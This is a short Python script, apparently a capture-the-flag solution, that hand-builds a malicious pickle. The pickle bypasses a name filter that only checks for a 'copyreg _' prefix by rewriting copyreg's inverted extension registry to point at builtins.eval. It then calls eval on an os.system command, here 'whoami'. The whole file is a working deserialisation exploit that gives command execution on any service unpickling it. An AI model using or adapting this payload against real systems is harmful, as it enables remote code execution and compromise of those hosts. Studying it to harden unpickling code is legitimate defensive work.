```py -cwn
import base64, pickletools

def build():
    """
    Builds a textual pickle that:
      1) loads copyreg._inverted_registry via GLOBAL (prefix 'copyreg _' works),
      2) writes inverted_registry[1] = ('builtins','eval') via SETITEM,
      3) loads eval via EXT1 1,
      4) runs REDUCE(eval, (cmd,)).
    """
    p = bytearray()

    # 1) GLOBAL 'copyreg _inverted_registry'  ==> passes startswith("copyreg _")
    p += b'c' + b'copyreg\n' + b'_inverted_registry\n'

    # 2) inverted_registry[1] = ('builtins','eval')
    #    Beware of SETITEM order: the stack must be [ ..., dict, key, value ]
    p += b'I1\n'                 # key = 1
    p += b"S'builtins'\n"        # push 'builtins'
    p += b"S'eval'\n"            # push 'eval'
    p += b'\x86'                 # TUPLE2 -> ('builtins','eval') = value
    p += b's'                    # SETITEM -> dict[1] = ('builtins','eval')
    p += b'0'                    # POP     -> nettoie la pile

    # 3) EXT1 1 -> resolves via copyreg._inverted_registry[1] == builtins.eval
    p += b'\x82' + b'\x01'       # EXT1 1

    # 4) REDUCE(eval, (cmd,))
    cmd = "__import__('os').system('whoami')"
    if not (cmd.startswith('"') and cmd.endswith('"')):
        cmd = '"' + cmd.replace('"', '\\"') + '"'
    p += b'S' + cmd.encode('utf-8') + b'\n'  # STRING cmd
    p += b'\x85'                 # TUPLE1
    p += b'R'                    # REDUCE -> eval(cmd)
    p += b'.'                    # STOP

    return bytes(p)

if __name__ == "__main__":
    payload = build()
    pickletools.dis(payload)
```
